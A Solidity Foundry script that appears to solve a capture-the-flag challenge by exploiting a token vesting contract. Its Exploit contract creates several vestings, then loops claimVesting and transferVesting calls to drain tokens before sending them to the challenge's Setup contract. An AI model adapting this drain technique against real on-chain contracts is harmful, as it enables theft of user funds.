// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Setup} from "src/challenge/Setup.sol";
import {Vest} from "src/challenge/Vest.sol";
import {VestToken} from "src/challenge/VestToken.sol";

contract ExploitScript is Script {

    function run() public {
        vm.startBroadcast();
        Setup setup = Setup(vm.envAddress("SETUP"));
        Vest vest = setup.vest();
        VestToken token = setup.token();
        Exploit exploit = new Exploit(setup, vest, token);
        console.log("exploit", address(exploit));
        exploit.run1();
        vm.stopBroadcast();
    }

    function run2() public {
        vm.startBroadcast();
        Exploit exploit = Exploit(vm.envAddress("EXPLOIT"));
        uint256 balance = exploit.run2();
        console.log("balance(this)", balance/1 ether);
        vm.stopBroadcast();
    }

    function run3() public {
        vm.startBroadcast();
        Exploit exploit = Exploit(vm.envAddress("EXPLOIT"));
        exploit.run3();
        vm.stopBroadcast();
    }
}

contract Exploit {
    Setup public setup;
    Vest public vest;
    VestToken public token;
    constructor(Setup _setup, Vest _vest, VestToken _token)
    {
        setup = _setup;
        vest = _vest;
        token = _token;
    }
    function run1() public {
        for(uint i=0;i<10;i++){
            vest.createVesting(address(this));
        }

    }
    function run2() public returns (uint256) {
            for(uint i=0;i<10;i++){
               vest.claimVesting(i);
               vest.transferVesting(i, address(address(this)), 1000 ether, i);
           }
           return token.balanceOf(address(this));
    }
    function run3() public {
        token.transfer(address(setup), token.balanceOf(address(this)));
    }
}
